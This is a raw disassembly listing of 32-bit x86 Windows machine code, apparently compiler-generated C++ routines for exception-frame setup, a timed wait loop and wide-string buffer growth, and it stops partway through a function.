  404e55:	8b 02                	mov    (%edx),%eax
  404e57:	8b 48 04             	mov    0x4(%eax),%ecx
  404e5a:	03 ca                	add    %edx,%ecx
  404e5c:	ff 15 ac 90 40 00    	call   *0x4090ac
  404e62:	b8 68 4e 40 00       	mov    $0x404e68,%eax
  404e67:	c3                   	ret
  404e68:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  404e6b:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404e6e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404e75:	8b 03                	mov    (%ebx),%eax
  404e77:	6a 00                	push   $0x0
  404e79:	52                   	push   %edx
  404e7a:	8b 48 04             	mov    0x4(%eax),%ecx
  404e7d:	03 cb                	add    %ebx,%ecx
  404e7f:	ff 15 ac 90 40 00    	call   *0x4090ac
  404e85:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  404e8c:	ff 15 04 91 40 00    	call   *0x409104
  404e92:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  404e95:	85 c0                	test   %eax,%eax
  404e97:	75 08                	jne    0x404ea1
  404e99:	8b ce                	mov    %esi,%ecx
  404e9b:	ff 15 b4 90 40 00    	call   *0x4090b4
  404ea1:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  404ea5:	8b 06                	mov    (%esi),%eax
  404ea7:	8b 40 04             	mov    0x4(%eax),%eax
  404eaa:	8b 4c 30 38          	mov    0x38(%eax,%esi,1),%ecx
  404eae:	85 c9                	test   %ecx,%ecx
  404eb0:	74 05                	je     0x404eb7
  404eb2:	8b 01                	mov    (%ecx),%eax
  404eb4:	ff 50 08             	call   *0x8(%eax)
  404eb7:	8b c3                	mov    %ebx,%eax
  404eb9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404ebc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404ec3:	59                   	pop    %ecx
  404ec4:	5f                   	pop    %edi
  404ec5:	5e                   	pop    %esi
  404ec6:	5b                   	pop    %ebx
  404ec7:	8b e5                	mov    %ebp,%esp
  404ec9:	5d                   	pop    %ebp
  404eca:	c3                   	ret
  404ecb:	cc                   	int3
  404ecc:	cc                   	int3
  404ecd:	cc                   	int3
  404ece:	cc                   	int3
  404ecf:	cc                   	int3
  404ed0:	55                   	push   %ebp
  404ed1:	8b ec                	mov    %esp,%ebp
  404ed3:	83 e4 f8             	and    $0xfffffff8,%esp
  404ed6:	83 ec 34             	sub    $0x34,%esp
  404ed9:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404ede:	33 c4                	xor    %esp,%eax
  404ee0:	89 44 24 30          	mov    %eax,0x30(%esp)
  404ee4:	53                   	push   %ebx
  404ee5:	56                   	push   %esi
  404ee6:	57                   	push   %edi
  404ee7:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  404eeb:	ff 15 10 91 40 00    	call   *0x409110
  404ef1:	8b d8                	mov    %eax,%ebx
  404ef3:	8b f2                	mov    %edx,%esi
  404ef5:	ff 15 dc 90 40 00    	call   *0x4090dc
  404efb:	56                   	push   %esi
  404efc:	53                   	push   %ebx
  404efd:	8b fa                	mov    %edx,%edi
  404eff:	89 44 24 18          	mov    %eax,0x18(%esp)
  404f03:	57                   	push   %edi
  404f04:	50                   	push   %eax
  404f05:	e8 b6 29 00 00       	call   0x4078c0
  404f0a:	6a 00                	push   $0x0
  404f0c:	68 00 ca 9a 3b       	push   $0x3b9aca00
  404f11:	52                   	push   %edx
  404f12:	50                   	push   %eax
  404f13:	e8 68 29 00 00       	call   0x407880
  404f18:	56                   	push   %esi
  404f19:	53                   	push   %ebx
  404f1a:	52                   	push   %edx
  404f1b:	50                   	push   %eax
  404f1c:	e8 af 28 00 00       	call   0x4077d0
  404f21:	56                   	push   %esi
  404f22:	53                   	push   %ebx
  404f23:	57                   	push   %edi
  404f24:	ff 74 24 1c          	push   0x1c(%esp)
  404f28:	89 44 24 24          	mov    %eax,0x24(%esp)
  404f2c:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  404f30:	e8 9b 28 00 00       	call   0x4077d0
  404f35:	8b c8                	mov    %eax,%ecx
  404f37:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  404f3b:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
  404f40:	8b c2                	mov    %edx,%eax
  404f42:	f7 e7                	mul    %edi
  404f44:	8b f0                	mov    %eax,%esi
  404f46:	8b c1                	mov    %ecx,%eax
  404f48:	f7 e7                	mul    %edi
  404f4a:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404f4e:	03 f2                	add    %edx,%esi
  404f50:	03 f8                	add    %eax,%edi
  404f52:	8b 44 24 20          	mov    0x20(%esp),%eax
  404f56:	13 de                	adc    %esi,%ebx
  404f58:	89 7c 24 14          	mov    %edi,0x14(%esp)
  404f5c:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  404f60:	8b 08                	mov    (%eax),%ecx
  404f62:	8b 50 04             	mov    0x4(%eax),%edx
  404f65:	8b c1                	mov    %ecx,%eax
  404f67:	0b c2                	or     %edx,%eax
  404f69:	74 55                	je     0x404fc0
  404f6b:	85 d2                	test   %edx,%edx
  404f6d:	7c 51                	jl     0x404fc0
  404f6f:	7f 04                	jg     0x404f75
  404f71:	85 c9                	test   %ecx,%ecx
  404f73:	72 4b                	jb     0x404fc0
  404f75:	6a 00                	push   $0x0
  404f77:	68 40 42 0f 00       	push   $0xf4240
  404f7c:	52                   	push   %edx
  404f7d:	51                   	push   %ecx
  404f7e:	e8 fd 28 00 00       	call   0x407880
  404f83:	83 ce ff             	or     $0xffffffff,%esi
  404f86:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  404f8b:	2b f0                	sub    %eax,%esi
  404f8d:	1b ca                	sbb    %edx,%ecx
  404f8f:	3b fe                	cmp    %esi,%edi
  404f91:	75 04                	jne    0x404f97
  404f93:	3b d9                	cmp    %ecx,%ebx
  404f95:	74 18                	je     0x404faf
  404f97:	3b d9                	cmp    %ecx,%ebx
  404f99:	7f 14                	jg     0x404faf
  404f9b:	7c 04                	jl     0x404fa1
  404f9d:	3b fe                	cmp    %esi,%edi
  404f9f:	73 0e                	jae    0x404faf
  404fa1:	03 f8                	add    %eax,%edi
  404fa3:	89 7c 24 14          	mov    %edi,0x14(%esp)
  404fa7:	13 da                	adc    %edx,%ebx
  404fa9:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  404fad:	eb 11                	jmp    0x404fc0
  404faf:	83 c8 ff             	or     $0xffffffff,%eax
  404fb2:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
  404fb7:	89 44 24 14          	mov    %eax,0x14(%esp)
  404fbb:	89 54 24 0c          	mov    %edx,0xc(%esp)
  404fbf:	90                   	nop
  404fc0:	ff 15 10 91 40 00    	call   *0x409110
  404fc6:	8b d8                	mov    %eax,%ebx
  404fc8:	8b f2                	mov    %edx,%esi
  404fca:	ff 15 dc 90 40 00    	call   *0x4090dc
  404fd0:	56                   	push   %esi
  404fd1:	53                   	push   %ebx
  404fd2:	8b fa                	mov    %edx,%edi
  404fd4:	89 44 24 18          	mov    %eax,0x18(%esp)
  404fd8:	57                   	push   %edi
  404fd9:	50                   	push   %eax
  404fda:	e8 e1 28 00 00       	call   0x4078c0
  404fdf:	6a 00                	push   $0x0
  404fe1:	68 00 ca 9a 3b       	push   $0x3b9aca00
  404fe6:	52                   	push   %edx
  404fe7:	50                   	push   %eax
  404fe8:	e8 93 28 00 00       	call   0x407880
  404fed:	56                   	push   %esi
  404fee:	53                   	push   %ebx
  404fef:	52                   	push   %edx
  404ff0:	50                   	push   %eax
  404ff1:	e8 da 27 00 00       	call   0x4077d0
  404ff6:	56                   	push   %esi
  404ff7:	53                   	push   %ebx
  404ff8:	57                   	push   %edi
  404ff9:	ff 74 24 1c          	push   0x1c(%esp)
  404ffd:	89 44 24 28          	mov    %eax,0x28(%esp)
  405001:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  405005:	e8 c6 27 00 00       	call   0x4077d0
  40500a:	8b c8                	mov    %eax,%ecx
  40500c:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  405010:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
  405015:	8b c2                	mov    %edx,%eax
  405017:	f7 e7                	mul    %edi
  405019:	8b f0                	mov    %eax,%esi
  40501b:	8b c1                	mov    %ecx,%eax
  40501d:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  405021:	f7 e7                	mul    %edi
  405023:	8b 7c 24 14          	mov    0x14(%esp),%edi
  405027:	03 f2                	add    %edx,%esi
  405029:	03 c8                	add    %eax,%ecx
  40502b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40502f:	13 c6                	adc    %esi,%eax
  405031:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  405035:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  405039:	3b f9                	cmp    %ecx,%edi
  40503b:	75 08                	jne    0x405045
  40503d:	3b d8                	cmp    %eax,%ebx
  40503f:	0f 84 9d 00 00 00    	je     0x4050e2
  405045:	3b d8                	cmp    %eax,%ebx
  405047:	0f 8c 95 00 00 00    	jl     0x4050e2
  40504d:	7f 08                	jg     0x405057
  40504f:	3b f9                	cmp    %ecx,%edi
  405051:	0f 82 8b 00 00 00    	jb     0x4050e2
  405057:	ff 15 d8 90 40 00    	call   *0x4090d8
  40505d:	6a 00                	push   $0x0
  40505f:	6a 64                	push   $0x64
  405061:	52                   	push   %edx
  405062:	50                   	push   %eax
  405063:	e8 18 28 00 00       	call   0x407880
  405068:	2b 7c 24 18          	sub    0x18(%esp),%edi
  40506c:	8b f0                	mov    %eax,%esi
  40506e:	89 54 24 20          	mov    %edx,0x20(%esp)
  405072:	8b cf                	mov    %edi,%ecx
  405074:	1b 5c 24 1c          	sbb    0x1c(%esp),%ebx
  405078:	8b d3                	mov    %ebx,%edx
  40507a:	89 74 24 10          	mov    %esi,0x10(%esp)
  40507e:	e8 fd 28 00 00       	call   0x407980
  405083:	66 0f 2f 05 00 96 40 	comisd 0x409600,%xmm0
  40508a:	00 
  40508b:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  40508f:	76 0e                	jbe    0x40509f
  405091:	bf 00 00 16 ad       	mov    $0xad160000,%edi
  405096:	bb cd 11 03 00       	mov    $0x311cd,%ebx
  40509b:	03 f7                	add    %edi,%esi
  40509d:	eb 06                	jmp    0x4050a5
  40509f:	8b f7                	mov    %edi,%esi
  4050a1:	03 74 24 10          	add    0x10(%esp),%esi
  4050a5:	8b 44 24 10          	mov    0x10(%esp),%eax
  4050a9:	03 c7                	add    %edi,%eax
  4050ab:	6a 00                	push   $0x0
  4050ad:	68 00 ca 9a 3b       	push   $0x3b9aca00
  4050b2:	13 cb                	adc    %ebx,%ecx
  4050b4:	51                   	push   %ecx
  4050b5:	50                   	push   %eax
  4050b6:	e8 15 27 00 00       	call   0x4077d0
  4050bb:	89 44 24 28          	mov    %eax,0x28(%esp)
  4050bf:	69 c0 00 ca 9a 3b    	imul   $0x3b9aca00,%eax,%eax
  4050c5:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  4050c9:	2b f0                	sub    %eax,%esi
  4050cb:	8d 44 24 28          	lea    0x28(%esp),%eax
  4050cf:	50                   	push   %eax
  4050d0:	89 74 24 34          	mov    %esi,0x34(%esp)
  4050d4:	ff 15 e0 90 40 00    	call   *0x4090e0
  4050da:	83 c4 04             	add    $0x4,%esp
  4050dd:	e9 de fe ff ff       	jmp    0x404fc0
  4050e2:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  4050e6:	5f                   	pop    %edi
  4050e7:	5e                   	pop    %esi
  4050e8:	5b                   	pop    %ebx
  4050e9:	33 cc                	xor    %esp,%ecx
  4050eb:	e8 89 19 00 00       	call   0x406a79
  4050f0:	8b e5                	mov    %ebp,%esp
  4050f2:	5d                   	pop    %ebp
  4050f3:	c3                   	ret
  4050f4:	cc                   	int3
  4050f5:	cc                   	int3
  4050f6:	cc                   	int3
  4050f7:	cc                   	int3
  4050f8:	cc                   	int3
  4050f9:	cc                   	int3
  4050fa:	cc                   	int3
  4050fb:	cc                   	int3
  4050fc:	cc                   	int3
  4050fd:	cc                   	int3
  4050fe:	cc                   	int3
  4050ff:	cc                   	int3
  405100:	55                   	push   %ebp
  405101:	8b ec                	mov    %esp,%ebp
  405103:	6a ff                	push   $0xffffffff
  405105:	68 96 7f 40 00       	push   $0x407f96
  40510a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405110:	50                   	push   %eax
  405111:	83 ec 10             	sub    $0x10,%esp
  405114:	a1 04 c0 40 00       	mov    0x40c004,%eax
  405119:	33 c5                	xor    %ebp,%eax
  40511b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40511e:	53                   	push   %ebx
  40511f:	56                   	push   %esi
  405120:	57                   	push   %edi
  405121:	50                   	push   %eax
  405122:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405125:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40512b:	8b f1                	mov    %ecx,%esi
  40512d:	89 75 ec             	mov    %esi,-0x14(%ebp)
  405130:	6a 00                	push   $0x0
  405132:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405135:	ff 15 08 91 40 00    	call   *0x409108
  40513b:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  405142:	a1 8c c7 40 00       	mov    0x40c78c,%eax
  405147:	8b 0d f0 90 40 00    	mov    0x4090f0,%ecx
  40514d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405150:	ff 15 98 90 40 00    	call   *0x409098
  405156:	8b 56 04             	mov    0x4(%esi),%edx
  405159:	8b d8                	mov    %eax,%ebx
  40515b:	8d 3c 9d 00 00 00 00 	lea    0x0(,%ebx,4),%edi
  405162:	3b 5a 0c             	cmp    0xc(%edx),%ebx
  405165:	73 0c                	jae    0x405173
  405167:	8b 4a 08             	mov    0x8(%edx),%ecx
  40516a:	8b 34 0f             	mov    (%edi,%ecx,1),%esi
  40516d:	85 f6                	test   %esi,%esi
  40516f:	75 5e                	jne    0x4051cf
  405171:	eb 02                	jmp    0x405175
  405173:	33 f6                	xor    %esi,%esi
  405175:	80 7a 14 00          	cmpb   $0x0,0x14(%edx)
  405179:	74 11                	je     0x40518c
  40517b:	ff 15 fc 90 40 00    	call   *0x4090fc
  405181:	3b 58 0c             	cmp    0xc(%eax),%ebx
  405184:	73 0a                	jae    0x405190
  405186:	8b 40 08             	mov    0x8(%eax),%eax
  405189:	8b 34 07             	mov    (%edi,%eax,1),%esi
  40518c:	85 f6                	test   %esi,%esi
  40518e:	75 3f                	jne    0x4051cf
  405190:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  405193:	85 f6                	test   %esi,%esi
  405195:	75 38                	jne    0x4051cf
  405197:	ff 75 ec             	push   -0x14(%ebp)
  40519a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40519d:	50                   	push   %eax
  40519e:	ff 15 c4 90 40 00    	call   *0x4090c4
  4051a4:	83 c4 08             	add    $0x8,%esp
  4051a7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4051aa:	74 4a                	je     0x4051f6
  4051ac:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4051af:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4051b2:	56                   	push   %esi
  4051b3:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4051b7:	e8 8b 18 00 00       	call   0x406a47
  4051bc:	8b 06                	mov    (%esi),%eax
  4051be:	83 c4 04             	add    $0x4,%esp
  4051c1:	8b ce                	mov    %esi,%ecx
  4051c3:	ff 50 04             	call   *0x4(%eax)
  4051c6:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4051c9:	89 35 8c c7 40 00    	mov    %esi,0x40c78c
  4051cf:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4051d2:	ff 15 0c 91 40 00    	call   *0x40910c
  4051d8:	8b c6                	mov    %esi,%eax
  4051da:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4051dd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4051e4:	59                   	pop    %ecx
  4051e5:	5f                   	pop    %edi
  4051e6:	5e                   	pop    %esi
  4051e7:	5b                   	pop    %ebx
  4051e8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4051eb:	33 cd                	xor    %ebp,%ecx
  4051ed:	e8 87 18 00 00       	call   0x406a79
  4051f2:	8b e5                	mov    %ebp,%esp
  4051f4:	5d                   	pop    %ebp
  4051f5:	c3                   	ret
  4051f6:	e8 d5 c6 ff ff       	call   0x4018d0
  4051fb:	cc                   	int3
  4051fc:	cc                   	int3
  4051fd:	cc                   	int3
  4051fe:	cc                   	int3
  4051ff:	cc                   	int3
  405200:	55                   	push   %ebp
  405201:	8b ec                	mov    %esp,%ebp
  405203:	83 ec 08             	sub    $0x8,%esp
  405206:	53                   	push   %ebx
  405207:	8b d9                	mov    %ecx,%ebx
  405209:	b9 fe ff ff 7f       	mov    $0x7ffffffe,%ecx
  40520e:	8b c1                	mov    %ecx,%eax
  405210:	56                   	push   %esi
  405211:	57                   	push   %edi
  405212:	8b 53 10             	mov    0x10(%ebx),%edx
  405215:	2b c2                	sub    %edx,%eax
  405217:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40521a:	83 f8 01             	cmp    $0x1,%eax
  40521d:	0f 82 34 01 00 00    	jb     0x405357
  405223:	8b 73 14             	mov    0x14(%ebx),%esi
  405226:	8d 7a 01             	lea    0x1(%edx),%edi
  405229:	83 cf 07             	or     $0x7,%edi
  40522c:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40522f:	3b f9                	cmp    %ecx,%edi
  405231:	76 04                	jbe    0x405237
  405233:	8b f9                	mov    %ecx,%edi
  405235:	eb 18                	jmp    0x40524f
  405237:	8b c6                	mov    %esi,%eax
  405239:	d1 e8                	shr    $1,%eax
  40523b:	2b c8                	sub    %eax,%ecx
  40523d:	3b f1                	cmp    %ecx,%esi
  40523f:	76 07                	jbe    0x405248
  405241:	bf fe ff ff 7f       	mov    $0x7ffffffe,%edi
  405246:	eb 07                	jmp    0x40524f
  405248:	03 c6                	add    %esi,%eax
  40524a:	3b f8                	cmp    %eax,%edi
  40524c:	0f 42 f8             	cmovb  %eax,%edi
  40524f:	33 c9                	xor    %ecx,%ecx
  405251:	8b c7                	mov    %edi,%eax
  405253:	83 c0 01             	add    $0x1,%eax
  405256:	0f 92 c1             	setb   %cl
  405259:	f7 d9                	neg    %ecx
  40525b:	0b c8                	or     %eax,%ecx
  40525d:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  405263:	0f 87 e9 00 00 00    	ja     0x405352
  405269:	03 c9                	add    %ecx,%ecx
  40526b:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  405271:	72 2a                	jb     0x40529d
  405273:	8d 41 23             	lea    0x23(%ecx),%eax
  405276:	3b c1                	cmp    %ecx,%eax
  405278:	0f 86 d4 00 00 00    	jbe    0x405352
  40527e:	50                   	push   %eax
  40527f:	e8 03 18 00 00       	call   0x406a87
  405284:	83 c4 04             	add    $0x4,%esp
  405287:	85 c0                	test   %eax,%eax
  405289:	0f 84 96 00 00 00    	je     0x405325
  40528f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405292:	8d 70 23             	lea    0x23(%eax),%esi
  405295:	83 e6 e0             	and    $0xffffffe0,%esi
  405298:	89 46 fc             	mov    %eax,-0x4(%esi)
  40529b:	eb 16                	jmp    0x4052b3
  40529d:	85 c9                	test   %ecx,%ecx
  40529f:	74 10                	je     0x4052b1
  4052a1:	51                   	push   %ecx
  4052a2:	e8 e0 17 00 00       	call   0x406a87
  4052a7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4052aa:	83 c4 04             	add    $0x4,%esp
  4052ad:	8b f0                	mov    %eax,%esi
  4052af:	eb 02                	jmp    0x4052b3
  4052b1:	33 f6                	xor    %esi,%esi
  4052b3:	83 7d f8 08          	cmpl   $0x8,-0x8(%ebp)
  4052b7:	8d 42 01             	lea    0x1(%edx),%eax
  4052ba:	89 7b 14             	mov    %edi,0x14(%ebx)
  4052bd:	8d 3c 12             	lea    (%edx,%edx,1),%edi
  4052c0:	89 43 10             	mov    %eax,0x10(%ebx)
  4052c3:	72 66                	jb     0x40532b
  4052c5:	8b 3b                	mov    (%ebx),%edi
  4052c7:	8d 04 12             	lea    (%edx,%edx,1),%eax
  4052ca:	50                   	push   %eax
  4052cb:	57                   	push   %edi
  4052cc:	56                   	push   %esi
  4052cd:	e8 ef 26 00 00       	call   0x4079c1
  4052d2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4052d5:	83 c4 0c             	add    $0xc,%esp
  4052d8:	66 8b 45 10          	mov    0x10(%ebp),%ax
  4052dc:	8d 0c 12             	lea    (%edx,%edx,1),%ecx
  4052df:	66 89 04 31          	mov    %ax,(%ecx,%esi,1)
  4052e3:	33 c0                	xor    %eax,%eax
  4052e5:	66 89 44 31 02       	mov    %ax,0x2(%ecx,%esi,1)
  4052ea:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4052ed:	8d 0c 45 02 00 00 00 	lea    0x2(,%eax,2),%ecx
  4052f4:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4052fa:	72 12                	jb     0x40530e
  4052fc:	8b 57 fc             	mov    -0x4(%edi),%edx
  4052ff:	83 c1 23             	add    $0x23,%ecx
  405302:	2b fa                	sub    %edx,%edi
  405304:	8d 47 fc             	lea    -0x4(%edi),%eax
  405307:	83 f8 1f             	cmp    $0x1f,%eax
  40530a:	77 19                	ja     0x405325
  40530c:	8b fa                	mov    %edx,%edi
  40530e:	51                   	push   %ecx
  40530f:	57                   	push   %edi
  405310:	e8 a7 17 00 00       	call   0x406abc
  405315:	83 c4 08             	add    $0x8,%esp
  405318:	89 33                	mov    %esi,(%ebx)
  40531a:	8b c3                	mov    %ebx,%eax
  40531c:	5f                   	pop    %edi
  40531d:	5e                   	pop    %esi
  40531e:	5b                   	pop    %ebx
  40531f:	8b e5                	mov    %ebp,%esp
  405321:	5d                   	pop    %ebp
  405322:	c2 0c 00             	ret    $0xc
  405325:	ff 15 80 91 40 00    	call   *0x409180
  40532b:	57                   	push   %edi
  40532c:	53                   	push   %ebx
  40532d:	56                   	push   %esi
  40532e:	e8 8e 26 00 00       	call   0x4079c1
  405333:	66 8b 4d 10          	mov    0x10(%ebp),%cx
  405337:	83 c4 0c             	add    $0xc,%esp
  40533a:	33 c0                	xor    %eax,%eax
  40533c:	66 89 0c 37          	mov    %cx,(%edi,%esi,1)
  405340:	66 89 44 37 02       	mov    %ax,0x2(%edi,%esi,1)
  405345:	8b c3                	mov    %ebx,%eax
  405347:	89 33                	mov    %esi,(%ebx)
  405349:	5f                   	pop    %edi
  40534a:	5e                   	pop    %esi
  40534b:	5b                   	pop    %ebx
  40534c:	8b e5                	mov    %ebp,%esp
  40534e:	5d                   	pop    %ebp
  40534f:	c2 0c 00             	ret    $0xc
  405352:	e8 79 bd ff ff       	call   0x4010d0
  405357:	e8 14 be ff ff       	call   0x401170
  40535c:	cc                   	int3
  40535d:	cc                   	int3
  40535e:	cc                   	int3
  40535f:	cc                   	int3
  405360:	55                   	push   %ebp
  405361:	8b ec                	mov    %esp,%ebp
  405363:	83 ec 10             	sub    $0x10,%esp
  405366:	8b 45 10             	mov    0x10(%ebp),%eax
  405369:	8b 55 08             	mov    0x8(%ebp),%edx
  40536c:	53                   	push   %ebx
  40536d:	8b d9                	mov    %ecx,%ebx
  40536f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405372:	b9 fe ff ff 7f       	mov    $0x7ffffffe,%ecx
  405377:	56                   	push   %esi
  405378:	8b c1                	mov    %ecx,%eax
  40537a:	8b 73 10             	mov    0x10(%ebx),%esi
  40537d:	2b c6                	sub    %esi,%eax
  40537f:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405382:	57                   	push   %edi
  405383:	3b c2                	cmp    %edx,%eax
  405385:	0f 82 50 01 00 00    	jb     0x4054db
  40538b:	8b 7b 14             	mov    0x14(%ebx),%edi
  40538e:	8d 04 16             	lea    (%esi,%edx,1),%eax
  405391:	8b f0                	mov    %eax,%esi
  405393:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405396:	83 ce 07             	or     $0x7,%esi
  405399:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40539c:	3b f1                	cmp    %ecx,%esi
  40539e:	76 04                	jbe    0x4053a4
  4053a0:	8b f1                	mov    %ecx,%esi
  4053a2:	eb 18                	jmp    0x4053bc
  4053a4:	8b c7                	mov    %edi,%eax
  4053a6:	d1 e8                	shr    $1,%eax
  4053a8:	2b c8                	sub    %eax,%ecx
  4053aa:	3b f9                	cmp    %ecx,%edi
  4053ac:	76 07                	jbe    0x4053b5
  4053ae:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  4053b3:	eb 07                	jmp    0x4053bc
  4053b5:	03 c7                	add    %edi,%eax
  4053b7:	3b f0                	cmp    %eax,%esi
  4053b9:	0f 42 f0             	cmovb  %eax,%esi
  4053bc:	33 c9                	xor    %ecx,%ecx
  4053be:	8b c6                	mov    %esi,%eax
  4053c0:	83 c0 01             	add    $0x1,%eax
  4053c3:	0f 92 c1             	setb   %cl
  4053c6:	f7 d9                	neg    %ecx
  4053c8:	0b c8                	or     %eax,%ecx
  4053ca:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  4053d0:	0f 87 00 01 00 00    	ja     0x4054d6
  4053d6:	03 c9                	add    %ecx,%ecx
  4053d8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4053de:	72 27                	jb     0x405407
  4053e0:	8d 41 23             	lea    0x23(%ecx),%eax
  4053e3:	3b c1                	cmp    %ecx,%eax
  4053e5:	0f 86 eb 00 00 00    	jbe    0x4054d6
  4053eb:	50                   	push   %eax
  4053ec:	e8 96 16 00 00       	call   0x406a87
  4053f1:	83 c4 04             	add    $0x4,%esp
  4053f4:	85 c0                	test   %eax,%eax
  4053f6:	0f 84 a9 00 00 00    	je     0x4054a5
  4053fc:	8d 78 23             	lea    0x23(%eax),%edi
  4053ff:	83 e7 e0             	and    $0xffffffe0,%edi
  405402:	89 47 fc             	mov    %eax,-0x4(%edi)
  405405:	eb 13                	jmp    0x40541a
  405407:	85 c9                	test   %ecx,%ecx
  405409:	74 0d                	je     0x405418
  40540b:	51                   	push   %ecx
  40540c:	e8 76 16 00 00       	call   0x406a87
  405411:	83 c4 04             	add    $0x4,%esp
  405414:	8b f8                	mov    %eax,%edi
  405416:	eb 02                	jmp    0x40541a
  405418:	33 ff                	xor    %edi,%edi
  40541a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40541d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405420:	89 43 10             	mov    %eax,0x10(%ebx)
  405423:	89 73 14             	mov    %esi,0x14(%ebx)
  405426:	8d 0c 12             	lea    (%edx,%edx,1),%ecx
  405429:	8d 04 0f             	lea    (%edi,%ecx,1),%eax
  40542c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40542f:	8b 45 14             	mov    0x14(%ebp),%eax
  405432:	51                   	push   %ecx
  405433:	8d 34 00             	lea    (%eax,%eax,1),%esi
  405436:	03 c2                	add    %edx,%eax
  405438:	83 7d f4 08          	cmpl   $0x8,-0xc(%ebp)
  40543c:	8d 04 47             	lea    (%edi,%eax,2),%eax
  40543f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405442:	72 67                	jb     0x4054ab
  405444:	8b 33                	mov    (%ebx),%esi
  405446:	56                   	push   %esi
  405447:	57                   	push   %edi
  405448:	e8 74 25 00 00       	call   0x4079c1
  40544d:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405450:	8d 04 09             	lea    (%ecx,%ecx,1),%eax
  405453:	50                   	push   %eax
  405454:	ff 75 f0             	push   -0x10(%ebp)
  405457:	ff 75 fc             	push   -0x4(%ebp)
  40545a:	e8 62 25 00 00       	call   0x4079c1
  40545f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405462:	33 c9                	xor    %ecx,%ecx
  405464:	83 c4 18             	add    $0x18,%esp
  405467:	66 89 08             	mov    %cx,(%eax)
  40546a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40546d:	8d 0c 45 02 00 00 00 	lea    0x2(,%eax,2),%ecx
  405474:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40547a:	72 12                	jb     0x40548e
  40547c:	8b 56 fc             	mov    -0x4(%esi),%edx
  40547f:	83 c1 23             	add    $0x23,%ecx
  405482:	2b f2                	sub    %edx,%esi
  405484:	8d 46 fc             	lea    -0x4(%esi),%eax
  405487:	83 f8 1f             	cmp    $0x1f,%eax
  40548a:	77 19                	ja     0x4054a5
  40548c:	8b f2                	mov    %edx,%esi
  40548e:	51                   	push   %ecx
  40548f:	56                   	push   %esi
  405490:	e8 27 16 00 00       	call   0x406abc
  405495:	83 c4 08             	add    $0x8,%esp
  405498:	89 3b                	mov    %edi,(%ebx)
  40549a:	8b c3                	mov    %ebx,%eax
  40549c:	5f                   	pop    %edi
  40549d:	5e                   	pop    %esi
  40549e:	5b                   	pop    %ebx
  40549f:	8b e5                	mov    %ebp,%esp
  4054a1:	5d                   	pop    %ebp
  4054a2:	c2 10 00             	ret    $0x10
  4054a5:	ff 15 80 91 40 00    	call   *0x409180
  4054ab:	53                   	push   %ebx
  4054ac:	57                   	push   %edi
  4054ad:	e8 0f 25 00 00       	call   0x4079c1
  4054b2:	56                   	push   %esi
  4054b3:	ff 75 f0             	push   -0x10(%ebp)
